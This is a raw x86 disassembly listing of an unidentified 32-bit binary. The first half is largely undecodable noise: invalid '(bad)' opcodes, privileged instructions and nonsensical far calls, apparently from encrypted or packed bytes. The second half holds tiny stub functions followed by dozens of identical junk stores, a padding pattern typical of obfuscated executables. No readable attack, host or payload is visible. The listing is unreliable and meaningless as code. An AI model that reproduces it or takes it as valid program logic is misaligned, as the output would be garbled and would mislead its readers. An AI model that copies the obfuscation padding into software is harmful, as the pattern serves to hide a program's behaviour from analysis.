  41cf74:	mov    WORD PTR [edi+edi*2+0x7fe69055],ss
  41cf7b:	inc    ebp
  41cf7c:	ins    BYTE PTR es:[edi],dx
  41cf7d:	sbb    eax,0x89dd3441
  41cf82:	pop    esi
  41cf83:	lock das 
  41cf85:	mov    al,ds:0x7d8c417b
  41cf8a:	push   ds
  41cf8b:	push   0xffffffcc
  41cf8d:	cld    
  41cf8e:	or     BYTE PTR [eax],dh
  41cf90:	mov    WORD PTR [edi+edi*2+0x5ee65855],ss
  41cf97:	add    BYTE PTR [ebx-0x21],dl
  41cf9a:	clc    
  41cf9b:	mov    ds:0x4a01a0,eax
  41cfa0:	xrstors [edi+esi*2]
  41cfa4:	int    0x94
  41cfa6:	or     BYTE PTR [ebp-0x67],dh
  41cfa9:	dec    BYTE PTR [eax+0x68]
	...
  41cfc0:	mov    esp,es
  41cfc2:	or     BYTE PTR [eax],al
  41cfc4:	pop    ss
  41cfc5:	iret   
  41cfc6:	hlt    
  41cfc7:	push   eax
  41cfc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfc9:	xchg   esp,eax
  41cfca:	repz push ebp
  41cfcc:	sbb    al,0x35
  41cfce:	sbb    eax,0x7f944d77
  41cfd3:	dec    ebp
  41cfd4:	call   0x81a15f3
  41cfd9:	(bad)  
  41cfdb:	mov    ecx,DWORD PTR [ecx+0x6c]
  41cfde:	or     BYTE PTR [edx-0x58],al
  41cfe1:	sbb    ecx,DWORD PTR [esi-0x20]
  41cfe4:	pop    ss
  41cfe5:	xlat   BYTE PTR ds:[ebx]
  41cfe6:	call   0x57260d76
  41cfeb:	mov    ecx,DWORD PTR [ecx+0x70]
  41cfee:	pop    ecx
  41cfef:	mov    ebx,DWORD PTR [ecx-0x73be8460]
  41cff5:	jecxz  0x41cfd7
  41cff7:	push   ecx
  41cff8:	mov    ecx,0xc883f488
  41cffd:	xchg   edi,eax
  41cffe:	jg     0x41d055
  41d000:	lods   al,BYTE PTR ds:[esi]
  41d001:	adc    al,0xaf
  41d003:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d004:	mov    WORD PTR [eax+ecx*1+0x7fcb2000],ss
  41d00b:	inc    ebp
  41d00c:	lods   al,BYTE PTR ds:[esi]
  41d00d:	sbb    al,0x46
  41d00f:	fmul   DWORD PTR [edi-0x73ff56e4]
  41d015:	xchg   esp,eax
  41d016:	or     DWORD PTR [ebp+0x68],0x2de05e1c
  41d01d:	mov    eax,ds:0xbb8c417b
  41d022:	inc    esi
  41d023:	xor    al,0x0
	...
  41d035:	add    BYTE PTR [eax],al
  41d037:	add    BYTE PTR [edi],ch
  41d039:	aad    0x7b
  41d03b:	inc    ecx
  41d03c:	mov    WORD PTR [ebx],ds
  41d03e:	push   es
  41d03f:	inc    eax
  41d040:	fcmovnbe st,st(5)
  41d042:	or     BYTE PTR [ecx+0x17],dl
  41d045:	mov    ds:0x94cd771c,al
  41d04a:	push   esi
  41d04b:	mov    edx,ecx
  41d04d:	js     0x41d0a8
  41d04f:	call   0x365bc4
  41d054:	sqrtps xmm0,XMMWORD PTR ds:0x8074d18b
  41d05b:	adc    eax,0x49ff80
  41d060:	(bad)  
  41d061:	in     eax,0x20
  41d063:	mov    DWORD PTR [ecx-0x73be841c],esp
  41d069:	adc    esi,DWORD PTR [esi]
  41d06b:	xor    al,0x83
  41d06d:	aad    0x8
  41d06f:	add    BYTE PTR [ecx-0x48],bh
  41d072:	test   eax,0x8d56314
  41d077:	push   eax
  41d078:	pop    ss
  41d079:	call   0x8b59:0x944d7758
  41d080:	jns    0x41d03a
  41d082:	jnp    0x41d0c5
  41d084:	mov    edx,fs
  41d086:	loopne 0x41d0bd
  41d088:	rol    DWORD PTR [edi-0x672f7c0c],0xa9
  41d08f:	adc    al,0x3b
  41d091:	aad    0x8
  41d093:	push   eax
  41d094:	mov    ah,0x8f
  41d096:	out    dx,al
  41d097:	jmp    DWORD PTR [ebx+0x4cd13]
	...
  41d0ad:	add    BYTE PTR [eax],al
  41d0af:	add    BYTE PTR [edi-0x70db9f0c],ah
  41d0b5:	aam    0x8
  41d0b7:	mov    ebx,DWORD PTR [ecx-0x73be8434]
  41d0bd:	in     eax,0xe0
  41d0bf:	adc    DWORD PTR [esi-0x79],esi
  41d0c2:	hlt    
  41d0c3:	or     DWORD PTR [eax-0x64],0xffffff81
  41d0c7:	inc    ebp
  41d0c8:	inc    eax
  41d0c9:	sbb    ebx,DWORD PTR [esi]
  41d0cb:	adc    al,0xdb
  41d0cd:	aad    0x8
  41d0cf:	push   edx
  41d0d0:	pop    es
  41d0d1:	shr    eax,1
  41d0d3:	mov    eax,DWORD PTR [ecx-0x73be8460]
  41d0d9:	xchg   ebx,eax
  41d0da:	inc    eax
  41d0db:	sub    ch,bl
  41d0dd:	sbb    ebx,DWORD PTR [esi]
  41d0df:	sub    al,0xc3
  41d0e1:	aad    0x8
  41d0e3:	push   edx
  41d0e4:	and    al,0x7b
  41d0e6:	cmc    
  41d0e7:	jmp    FWORD PTR [ebx]
  41d0e9:	adc    ecx,ebp
  41d0eb:	or     al,0xed
  41d0ed:	mov    bh,0x7b
  41d0ef:	inc    ecx
  41d0f0:	mov    WORD PTR [ecx-0x6b728b38],ss
  41d0f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0f7:	pop    eax
  41d0f8:	adc    ebp,0x8
  41d0fb:	lea    edx,[ecx-0x74]
  41d0fe:	pop    edx
  41d0ff:	push   0x4c
  41d101:	cli    
  41d102:	or     cl,BYTE PTR [ebx+0x417bec99]
  41d108:	mov    edx,fs
  41d10a:	repz push ebp
  41d10c:	mov    eax,0xdbfca77b
  41d111:	xchg   BYTE PTR [ecx+0x1],dh
	...
  41d127:	add    BYTE PTR [esp+edx*4-0x174e74f8],cl
  41d12e:	mov    BYTE PTR [esp+ecx*4],0x58
  41d132:	(bad)
  41d135:	push   edi
  41d136:	vmulps ymm3,ymm6,YMMWORD PTR [ebx]
  41d13a:	in     eax,0x8b
  41d13c:	push   ecx
  41d13d:	pushf  
  41d13e:	jg     0x41d180
  41d140:	mov    al,ds:0xc8ccc7e8
  41d145:	push   edi
  41d146:	(bad)
  41d149:	sbb    esp,ebp
  41d14b:	push   ebx
  41d14c:	loop   0x41d12b
  41d14e:	jg     0x41d18d
  41d150:	lods   al,BYTE PTR ds:[esi]
  41d151:	std    
  41d152:	dec    ecx
  41d153:	add    BYTE PTR [edi],al
  41d155:	test   al,0x20
  41d157:	ja     0x41d126
  41d159:	xchg   esp,eax
  41d15a:	jg     0x41d191
  41d15c:	test   ch,bh
  41d15e:	dec    ecx
  41d15f:	add    bl,al
  41d161:	out    0x4f,al
  41d163:	pop    ebp
  41d164:	dec    edi
  41d165:	pop    ecx
  41d166:	(bad)
  41d169:	sbb    ebp,esp
  41d16b:	push   ecx
  41d16c:	mov    ah,0xc0
  41d16e:	pop    es
  41d16f:	inc    eax
  41d170:	mov    WORD PTR [ebx],?
  41d172:	xor    DWORD PTR [edi-0x33],esi
  41d175:	xchg   esp,eax
  41d176:	pop    eax
  41d177:	call   0x365d1c
  41d17c:	sqrtps xmm0,XMMWORD PTR [ecx]
  41d17f:	mov    ecx,ecx
  41d181:	mov    BYTE PTR [eax+0x5ee3844d],al
  41d187:	add    BYTE PTR [edi],al
  41d189:	mov    al,ds:0x775c
	...
  41d19e:	add    BYTE PTR [eax],al
  41d1a0:	dec    ebp
  41d1a1:	xchg   esp,eax
  41d1a2:	push   esi
  41d1a3:	call   FWORD PTR [ecx-0x78]
  41d1a6:	and    ch,0x59
  41d1a9:	push   ecx
  41d1aa:	vmulps ymm3,ymm6,YMMWORD PTR [ecx]
  41d1ae:	in     eax,0x83
  41d1b0:	clc    
  41d1b1:	mov    al,0xcb
  41d1b3:	inc    ebp
  41d1b4:	in     al,0x94
  41d1b6:	or     BYTE PTR [eax],al
  41d1b8:	mov    WORD PTR [ebp+0x4e],cs
  41d1bb:	fcom   QWORD PTR [esp+edx*4+0x8]
  41d1bf:	add    bl,dl
  41d1c1:	iret   
  41d1c2:	cld    
  41d1c3:	add    DWORD PTR [esp+edx*4-0x77ae38f8],ecx
  41d1ca:	or     DWORD PTR [eax],eax
  41d1cc:	mov    WORD PTR [ebx+ecx*8+0x894b045],ss
  41d1d3:	add    BYTE PTR [ecx+ebx*1-0x67faf7ba],cl
  41d1da:	and    al,0x77
  41d1dc:	dec    ebp
  41d1dd:	xchg   esp,eax
  41d1de:	loopne 0x41d249
  41d1e0:	test   BYTE PTR [ebp-0x24f5e0c],al
  41d1e6:	dec    ecx
  41d1e7:	add    BYTE PTR [ecx-0x73ff0b7b],dh
  41d1ed:	add    BYTE PTR ds:0x7bc091c7,al
  41d1f3:	inc    ecx
  41d1f4:	mov    WORD PTR [eax+ecx*1-0x867400],ss
  41d1fb:	(bad)  
  41d1fc:	mov    eax,eax
  41d1fe:	jnp    0x41d241
  41d200:	mov    WORD PTR [ebx+0x8],ss
	...
  41d216:	add    BYTE PTR [eax],al
  41d218:	mov    WORD PTR [ecx],ss
  41d21a:	ss sub al,0xc3
  41d21d:	ror    DWORD PTR [eax],cl
  41d21f:	add    BYTE PTR [ecx+0x6005cb9a],bh
  41d225:	std    
  41d226:	dec    ecx
  41d227:	add    BYTE PTR [esp+edx*4-0x38f0fff8],cl
  41d22e:	cmp    al,0x77
  41d230:	int    0x94
  41d232:	or     BYTE PTR [ebp-0x67],dh
  41d235:	cli    
  41d236:	or     bh,bh
  41d238:	cdq    
  41d239:	xchg   esp,eax
  41d23a:	jnp    0x41d27d
  41d23c:	mov    WORD PTR [ecx],?
  41d23e:	and    eax,0x7f944d77
  41d243:	or     eax,0x49fdb8
  41d248:	adc    eax,0x818be0d7
  41d24d:	mov    eax,0x198c417b
  41d252:	dec    esi
  41d253:	call   0x8976a4e7
  41d258:	dec    ecx
  41d259:	jl     0x41d1db
  41d25b:	dec    ebp
  41d25c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d25d:	sbb    al,BYTE PTR [esi]
  41d25f:	sbb    al,0x3b
  41d261:	ror    DWORD PTR [eax],cl
  41d263:	push   0x48914c
  41d268:	mov    ds:0x4d77089e,eax
  41d26d:	xchg   esp,eax
  41d26e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d26f:	cmp    BYTE PTR [ebx],bl
  41d271:	ror    DWORD PTR [eax],cl
  41d273:	(bad)  
  41d274:	xchg   ecx,eax
  41d275:	int3   
  41d276:	jnp    0x41d2b9
  41d278:	mov    ecx,?
  41d27a:	pop    es
  41d27b:	inc    eax
	...
  41d290:	mov    esp,gs
  41d292:	pop    eax
  41d293:	add    ecx,esp
  41d295:	xchg   esp,eax
  41d296:	jg     0x41d2ad
  41d298:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d299:	or     ecx,DWORD PTR [edx+0x0]
  41d29c:	mov    esi,0x5bf8876c
  41d2a1:	test   BYTE PTR [eax+0x4d3784c4],cl
  41d2a7:	ja     0x41d276
  41d2a9:	xchg   esp,eax
  41d2aa:	repz adc eax,0x4a0bc8
  41d2b0:	out    dx,eax
  41d2b1:	call   0x35ce1431
  41d2b6:	inc    ecx
  41d2b7:	ja     0x41d286
  41d2b9:	xchg   esp,eax
  41d2ba:	pop    eax
  41d2bb:	call   0x365598
  41d2c0:	mulps  xmm1,XMMWORD PTR ds:0x8084c989
  41d2c7:	dec    ebp
  41d2c8:	cld    
  41d2c9:	in     eax,0xe0
  41d2cb:	aad    0x2
  41d2cd:	test   ah,dh
  41d2cf:	adc    eax,0xffffff98
  41d2d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2d3:	xor    BYTE PTR [ebx-0x2b],bh
  41d2d6:	or     BYTE PTR [ebx+0x6a578441],cl
  41d2dc:	mov    WORD PTR ds:0x944d7739,?
  41d2e2:	pop    eax
  41d2e3:	call   0x364f18
  41d2e8:	mulps  xmm0,XMMWORD PTR ds:0x8284518b
  41d2ef:	dec    ebp
  41d2f0:	lods   al,BYTE PTR ds:[esi]
  41d2f1:	divps  xmm7,xmm4
	...
  41d308:	ja     0x41d2f3
  41d30a:	clc    
  41d30b:	jae    0x41d353
  41d30d:	cmovle esp,eax
  41d310:	cmp    al,0xf
  41d312:	inc    esi
  41d313:	fdivr  QWORD PTR ds:0x93fba36c
  41d319:	or     DWORD PTR [eax+0x353794c4],0x77
  41d320:	int    0x94
  41d322:	jg     0x41d339
  41d324:	mov    eax,0xde004a0b
  41d329:	xor    eax,0x94cd7741
  41d32e:	pop    es
  41d32f:	inc    ebp
  41d330:	push   0x9c0d7fe4
  41d335:	or     ecx,DWORD PTR [edx+0x0]
  41d338:	(bad)  
  41d339:	shl    esp,1
  41d33b:	push   ecx
  41d33c:	xor    al,0x2b
  41d33e:	out    dx,eax
  41d33f:	inc    DWORD PTR [ebx+0x17]
  41d342:	int    0xc
  41d344:	pop    es
  41d345:	jmp    0x611ad746
  41d34a:	or     BYTE PTR [ebp+0x30],dl
  41d34d:	or     eax,0xd917e45e
  41d352:	hlt    
  41d353:	add    edx,ecx
  41d355:	pusha  
  41d356:	add    BYTE PTR [ebp+0x10],0xf
  41d35a:	inc    esi
  41d35b:	loopne 0x41d314
  41d35d:	xchg   ecx,eax
  41d35e:	xor    al,0x77
  41d360:	dec    ebp
  41d361:	xchg   esp,eax
  41d362:	or     DWORD PTR [ebp-0x14],0x49c7936e
  41d369:	jl     0x41d374
	...
  41d37f:	add    BYTE PTR [esp+edx*4-0x16e8f621],cl
  41d386:	lock or esi,0xffffff97
  41d38a:	adc    DWORD PTR [ebp-0x2c],0x87f84e0e
  41d391:	fprem  
  41d393:	jae    0x41d319
  41d395:	clts   
  41d397:	xor    BYTE PTR [ebx-0x2b],al
  41d39a:	or     BYTE PTR [ebx],al
  41d39c:	inc    ecx
  41d39d:	jl     0x41d31f
  41d39f:	adc    DWORD PTR [edi+0x5ca1f0e9],ecx
  41d3a5:	or     ecx,DWORD PTR [edx+0x0]
  41d3a8:	(bad)  
  41d3a9:	f2xm1  
  41d3ab:	mov    DWORD PTR [edi+ecx*1+0x46],edi
  41d3af:	clc    
  41d3b0:	or     eax,0x8c03e254
  41d3b5:	xchg   esp,eax
  41d3b6:	jg     0x41d3cd
  41d3b8:	mov    esp,0x8f004a09
  41d3bd:	out    0xf0,eax
  41d3bf:	xor    edx,DWORD PTR [esi-0x3288c6cd]
  41d3c5:	xchg   esp,eax
  41d3c6:	pop    es
  41d3c7:	inc    ebp
  41d3c8:	push   esp
  41d3c9:	or     al,0x1
  41d3cb:	jmp    0x41d3e8
  41d3cd:	or     al,0x26
  41d3cf:	and    al,0xc3
  41d3d1:	ror    DWORD PTR [eax],cl
  41d3d3:	mov    DWORD PTR [ecx-0x73be844c],eax
  41d3d9:	(bad)
  41d3dc:	jns    0x41d37a
  41d3de:	jnp    0x41d421
  41d3e0:	mov    ebp,es
  41d3e2:	ror    DWORD PTR [ecx+0x0],0x0
	...
  41d3f5:	add    BYTE PTR [eax],al
  41d3f7:	add    BYTE PTR [ecx-0x73be8454],al
  41d3fd:	ins    BYTE PTR es:[edi],dx
  41d3fe:	add    edi,eax
  41d400:	adc    eax,DWORD PTR [edx+0x9bc0d80]
  41d406:	dec    edx
  41d407:	add    BYTE PTR [ebp+0x6c],bl
  41d40a:	pop    es
  41d40b:	sti    
  41d40c:	sti    
  41d40d:	or     DWORD PTR [esi+0x379879c0],0x7faef7c0
  41d417:	and    eax,0x4a09a8
  41d41c:	mulps  xmm1,XMMWORD PTR ds:0x7bc89183
  41d423:	inc    ecx
  41d424:	mov    WORD PTR [esp+edi*2+0x7ba8ed09],ss
  41d42b:	inc    ecx
  41d42c:	mov    WORD PTR [ebx],cs
  41d42e:	dec    ebp
  41d42f:	and    al,0x88
  41d431:	ins    BYTE PTR es:[edi],dx
  41d432:	jg     0x41d431
  41d434:	stos   DWORD PTR es:[edi],eax
  41d435:	add    DWORD PTR [eax+0x4a093c15],0x38553e00
  41d43f:	rol    BYTE PTR [edi],0x78
  41d442:	push   esi
  41d443:	ret    
  41d444:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  41d44b:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  41d452:	or     BYTE PTR [eax],al
  41d454:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
	...
  41d46f:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  41d476:	or     BYTE PTR [eax],al
  41d478:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  41d47f:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  41d486:	or     BYTE PTR [eax],al
  41d488:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  41d48f:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  41d496:	or     BYTE PTR [eax],al
  41d498:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  41d49f:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  41d4a6:	or     BYTE PTR [eax],al
  41d4a8:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  41d4af:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  41d4b6:	or     BYTE PTR [eax],al
  41d4b8:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  41d4bf:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  41d4c6:	or     BYTE PTR [eax],al
  41d4c8:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  41d4cf:	add    BYTE PTR [esp+edx*4+0x8],cl
	...
  41d4e6:	add    BYTE PTR [eax],al
  41d4e8:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  41d4ef:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  41d4f6:	or     BYTE PTR [eax],al
  41d4f8:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  41d4ff:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  41d506:	or     BYTE PTR [eax],al
  41d508:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  41d50f:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  41d516:	or     BYTE PTR [eax],al
  41d518:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  41d51f:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  41d526:	or     BYTE PTR [eax],al
  41d528:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  41d52f:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  41d536:	or     BYTE PTR [eax],al
  41d538:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  41d53f:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  41d546:	or     BYTE PTR [eax],al
  41d548:	mov    WORD PTR [eax+ecx*1+0x0],ss
	...
  41d55f:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  41d566:	or     BYTE PTR [eax],al
  41d568:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  41d56f:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  41d576:	or     BYTE PTR [eax],al
  41d578:	mov    WORD PTR [eax+ecx*1+0x8948c00],ss
  41d57f:	add    BYTE PTR [esp+edx*4-0x6b73fff8],cl
  41d586:	or     BYTE PTR [eax],al
  41d588:	mov    WORD PTR [eax+ecx*1-0x33333400],ss
  41d58f:	int3   
  41d590:	push   ebp
  41d591:	mov    ebp,esp
  41d593:	pop    ebp
  41d594:	ret    0x10
  41d597:	int3   
  41d598:	int3   
  41d599:	int3   
  41d59a:	int3   
  41d59b:	int3   
  41d59c:	int3   
  41d59d:	int3   
  41d59e:	int3   
  41d59f:	int3   
  41d5a0:	push   ebp
  41d5a1:	mov    ebp,esp
  41d5a3:	pop    ebp
  41d5a4:	ret    0x10
  41d5a7:	int3   
  41d5a8:	int3   
  41d5a9:	int3   
  41d5aa:	int3   
  41d5ab:	int3   
  41d5ac:	int3   
  41d5ad:	int3   
  41d5ae:	int3   
  41d5af:	int3   
  41d5b0:	push   ebp
  41d5b1:	mov    ebp,esp
  41d5b3:	call   0x41dc00
  41d5b8:	mov    eax,ds:0x4240c4
  41d5bd:	push   eax
  41d5be:	call   0x41e8e0
  41d5c3:	add    esp,0x4
  41d5c6:	mov    ds:0x4240c8,eax
  41d5cb:	pop    ebp
  41d5cc:	ret    
  41d5cd:	int3   
  41d5ce:	int3   
  41d5cf:	int3   
  41d5d0:	push   ebp
  41d5d1:	mov    ebp,esp
  41d5d3:	push   ecx
  41d5d4:	mov    DWORD PTR [ebp-0x4],0x4
  41d5db:	mov    eax,DWORD PTR [ebp-0x4]
  41d5de:	add    eax,0x40125c
  41d5e3:	mov    ds:0x4240cc,eax
  41d5e8:	mov    esp,ebp
  41d5ea:	pop    ebp
  41d5eb:	ret    
  41d5ec:	int3   
  41d5ed:	int3   
  41d5ee:	int3   
  41d5ef:	int3   
  41d5f0:	push   ebp
  41d5f1:	mov    ebp,esp
  41d5f3:	mov    eax,DWORD PTR [ebp+0x8]
  41d5f6:	mov    ecx,DWORD PTR [ebp+0x8]
  41d5f9:	add    ecx,DWORD PTR [eax+0x4]
  41d5fc:	mov    eax,ecx
  41d5fe:	pop    ebp
  41d5ff:	ret    
  41d600:	push   ebp
  41d601:	mov    ebp,esp
  41d603:	mov    eax,DWORD PTR [ebp+0x8]
  41d606:	mov    eax,DWORD PTR [eax-0x4]
  41d609:	pop    ebp
  41d60a:	ret    
  41d60b:	int3   
  41d60c:	int3   
  41d60d:	int3   
  41d60e:	int3   
  41d60f:	int3   
  41d610:	push   ebp
  41d611:	mov    ebp,esp
  41d613:	sub    esp,0x18
  41d616:	mov    eax,DWORD PTR [ebp+0x8]
  41d619:	mov    DWORD PTR [ebp-0x8],eax
  41d61c:	mov    ecx,DWORD PTR [ebp+0xc]
  41d61f:	mov    DWORD PTR [ebp-0x4],ecx
  41d622:	mov    DWORD PTR [ebp-0x10],0x19c
  41d629:	mov    edx,DWORD PTR [ebp-0x8]
  41d62c:	mov    DWORD PTR ds:0x4240d0,edx
  41d632:	mov    eax,DWORD PTR [ebp-0x4]
  41d635:	mov    ds:0x4240d4,eax
  41d63a:	mov    ecx,DWORD PTR ds:0x4240d0
  41d640:	mov    DWORD PTR [ebp-0x14],ecx
  41d643:	mov    edx,DWORD PTR ds:0x4240d4
  41d649:	mov    DWORD PTR [ebp-0xc],edx
  41d64c:	mov    eax,DWORD PTR [ebp-0xc]
  41d64f:	mov    ecx,DWORD PTR [ebp-0x14]
  41d652:	lea    edx,[ecx+eax*2]
  41d655:	mov    DWORD PTR [ebp-0x18],edx
  41d658:	mov    eax,DWORD PTR [ebp-0x18]
  41d65b:	mov    DWORD PTR [ebp-0x14],eax
  41d65e:	mov    ecx,DWORD PTR [ebp-0x14]
  41d661:	movzx  edx,WORD PTR [ecx]
  41d664:	mov    DWORD PTR [ebp-0xc],edx
  41d667:	mov    eax,DWORD PTR [ebp-0xc]
  41d66a:	mov    esp,ebp
  41d66c:	pop    ebp
  41d66d:	ret    
  41d66e:	int3   
  41d66f:	int3   
  41d670:	push   ebp
  41d671:	mov    ebp,esp
  41d673:	sub    esp,0xc
  41d676:	mov    eax,DWORD PTR [ebp+0x8]
  41d679:	mov    DWORD PTR [ebp-0x8],eax
  41d67c:	mov    ecx,DWORD PTR [ebp+0xc]
  41d67f:	mov    DWORD PTR [ebp-0xc],ecx
  41d682:	mov    DWORD PTR [ebp-0x4],0x11afc
  41d689:	mov    edx,DWORD PTR [ebp-0x8]
  41d68c:	cmp    edx,DWORD PTR [ebp-0xc]
  41d68f:	jae    0x41d69f
  41d691:	mov    DWORD PTR [ebp-0x4],0x11afc
  41d698:	mov    eax,DWORD PTR [ebp-0x8]
  41d69b:	jmp    0x41d6a9
  41d69d:	jmp    0x41d6a9
  41d69f:	mov    DWORD PTR [ebp-0x4],0x11afc
  41d6a6:	mov    eax,DWORD PTR [ebp-0xc]
  41d6a9:	mov    esp,ebp
  41d6ab:	pop    ebp
  41d6ac:	ret    
  41d6ad:	int3   
  41d6ae:	int3   
  41d6af:	int3   
  41d6b0:	push   ebp
  41d6b1:	mov    ebp,esp
  41d6b3:	push   ecx
  41d6b4:	mov    DWORD PTR [ebp-0x4],0x3085
  41d6bb:	mov    DWORD PTR [ebp-0x4],0x3085
  41d6c2:	mov    DWORD PTR [ebp-0x4],0x3085
  41d6c9:	mov    DWORD PTR [ebp-0x4],0x3085
  41d6d0:	mov    DWORD PTR [ebp-0x4],0x3085
  41d6d7:	mov    DWORD PTR [ebp-0x4],0x3085
  41d6de:	mov    DWORD PTR [ebp-0x4],0x3085
  41d6e5:	mov    DWORD PTR [ebp-0x4],0x3085
  41d6ec:	mov    DWORD PTR [ebp-0x4],0x3085
  41d6f3:	mov    DWORD PTR [ebp-0x4],0x3085
  41d6fa:	mov    DWORD PTR [ebp-0x4],0x3085
  41d701:	mov    DWORD PTR [ebp-0x4],0x3085
  41d708:	mov    DWORD PTR [ebp-0x4],0x3085
  41d70f:	mov    DWORD PTR [ebp-0x4],0x3085
  41d716:	mov    DWORD PTR [ebp-0x4],0x3085
  41d71d:	mov    DWORD PTR [ebp-0x4],0x3085
  41d724:	mov    DWORD PTR [ebp-0x4],0x3085
  41d72b:	mov    DWORD PTR [ebp-0x4],0x3085
  41d732:	mov    DWORD PTR [ebp-0x4],0x3085
  41d739:	mov    DWORD PTR [ebp-0x4],0x3085
  41d740:	mov    DWORD PTR [ebp-0x4],0x3085
  41d747:	mov    DWORD PTR [ebp-0x4],0x3085
  41d74e:	mov    DWORD PTR [ebp-0x4],0x3085
  41d755:	mov    DWORD PTR [ebp-0x4],0x3085
  41d75c:	mov    DWORD PTR [ebp-0x4],0x3085
  41d763:	mov    DWORD PTR [ebp-0x4],0x3085
  41d76a:	mov    DWORD PTR [ebp-0x4],0x3085
  41d771:	mov    DWORD PTR [ebp-0x4],0x3085
  41d778:	mov    DWORD PTR [ebp-0x4],0x3085
  41d77f:	mov    DWORD PTR [ebp-0x4],0x3085
  41d786:	mov    DWORD PTR [ebp-0x4],0x3085
  41d78d:	mov    DWORD PTR [ebp-0x4],0x3085
  41d794:	mov    DWORD PTR [ebp-0x4],0x3085
  41d79b:	mov    DWORD PTR [ebp-0x4],0x3085
  41d7a2:	mov    DWORD PTR [ebp-0x4],0x3085
  41d7a9:	mov    DWORD PTR [ebp-0x4],0x3085
  41d7b0:	mov    DWORD PTR [ebp-0x4],0x3085
  41d7b7:	mov    DWORD PTR [ebp-0x4],0x3085
  41d7be:	mov    DWORD PTR [ebp-0x4],0x3085
  41d7c5:	mov    DWORD PTR [ebp-0x4],0x3085
  41d7cc:	mov    DWORD PTR [ebp-0x4],0x3085
  41d7d3:	cmp    DWORD PTR [ebp+0x8],0x1
  41d7d7:	jne    0x41d7e1
  41d7d9:	mov    eax,ds:0x4240d8
  41d7de:	mov    DWORD PTR [ebp+0x8],eax
  41d7e1:	mov    ecx,DWORD PTR [ebp+0x10]
  41d7e4:	push   ecx
  41d7e5:	mov    edx,DWORD PTR [ebp+0xc]
  41d7e8:	push   edx
  41d7e9:	mov    eax,DWORD PTR [ebp+0x8]
  41d7ec:	push   eax
  41d7ed:	call   0x41e960
  41d7f2:	add    esp,0xc
  41d7f5:	mov    ecx,DWORD PTR [ebp+0x8]
  41d7f8:	push   ecx
  41d7f9:	call   0x41d5f0
  41d7fe:	add    esp,0x4
  41d801:	mov    DWORD PTR [ebp+0x8],eax
  41d804:	mov    eax,DWORD PTR [ebp+0x8]
  41d807:	mov    esp,ebp
  41d809:	pop    ebp
  41d80a:	ret    
  41d80b:	int3   
  41d80c:	int3   
  41d80d:	int3   
  41d80e:	int3   
  41d80f:	int3   
  41d810:	push   ebp
  41d811:	mov    ebp,esp
  41d813:	push   ecx
  41d814:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d81b:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d822:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d829:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d830:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d837:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d83e:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d845:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d84c:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d853:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d85a:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d861:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d868:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d86f:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d876:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d87d:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d884:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d88b:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d892:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d899:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d8a0:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d8a7:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d8ae:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d8b5:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d8bc:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d8c3:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d8ca:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d8d1:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d8d8:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d8df:	mov    DWORD PTR [ebp-0x4],0x22a7
